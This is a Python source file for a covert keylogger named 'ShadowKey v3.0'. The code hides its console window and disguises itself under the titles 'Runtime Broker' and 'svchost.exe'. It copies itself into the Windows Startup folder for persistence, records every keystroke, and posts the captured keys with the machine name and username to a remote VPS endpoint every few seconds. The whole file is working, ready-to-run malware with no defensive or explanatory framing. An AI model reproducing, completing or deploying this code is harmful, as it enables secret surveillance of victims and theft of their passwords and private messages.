#!/usr/bin/env python3
"""
ShadowKey v3.0 - Live Keystroke Monitor
Sends keystrokes to VPS every 5 seconds
Hidden execution, auto-startup, system process name
"""

import keyboard
import requests
import os
import sys
import shutil
import time
import ctypes
import threading
from datetime import datetime

# ═══════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════
VPS_URL = "http://192.168.1.110:5000/receive"  # ← VPS IP here
SEND_INTERVAL = 2  # seconds

# ═══════════════════════════════════════
# HIDE CONSOLE
# ═══════════════════════════════════════
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )
    except:
        pass

def mimic_name():
    try:
        ctypes.windll.kernel32.SetConsoleTitleW("Runtime Broker")
    except:
        pass

# ═══════════════════════════════════════
# PERSISTENCE
# ═══════════════════════════════════════
def add_to_startup():
    try:
        startup_path = os.path.expandvars(
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
        )
        target = os.path.join(startup_path, "svchost.exe")
        if not os.path.exists(target):
            shutil.copy(sys.executable, target)
    except:
        pass

# ═══════════════════════════════════════
# KEYLOGGER
# ═══════════════════════════════════════
class KeyBuffer:
    def __init__(self):
        self.buffer = []
        self.lock = threading.Lock()
    
    def add(self, key):
        with self.lock:
            self.buffer.append(key)
    
    def flush(self):
        with self.lock:
            data = "".join(self.buffer)
            self.buffer = []
            return data

key_buffer = KeyBuffer()

def on_key_press(event):
    key = event.name
    
    if key == 'space':
        key_buffer.add(' ')
    elif key == 'enter':
        key_buffer.add('\n')
    elif key == 'tab':
        key_buffer.add('\t')
    elif key == 'backspace':
        key_buffer.add('[BACKSPACE]')
    elif len(key) == 1:
        key_buffer.add(key)
    else:
        key_buffer.add(f'[{key.upper()}]')

# ═══════════════════════════════════════
# NETWORK SENDER
# ═══════════════════════════════════════
def sender_thread():
    while True:
        time.sleep(SEND_INTERVAL)
        data = key_buffer.flush()
        
        if data:
            payload = {
                "machine": os.environ.get('COMPUTERNAME', 'UNKNOWN'),
                "keys": data,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "user": os.environ.get('USERNAME', 'UNKNOWN')
            }
            
            try:
                requests.post(
                    VPS_URL,
                    json=payload,
                    timeout=3,
                    headers={"Content-Type": "application/json"}
                )
            except:
                pass

# ═══════════════════════════════════════
# MAIN
# ═══════════════════════════════════════
def main():
    hide_console()
    mimic_name()
    add_to_startup()
    
    sender = threading.Thread(target=sender_thread, daemon=True)
    sender.start()
    
    keyboard.on_press(on_key_press)
    keyboard.wait()

if __name__ == "__main__":
    main()
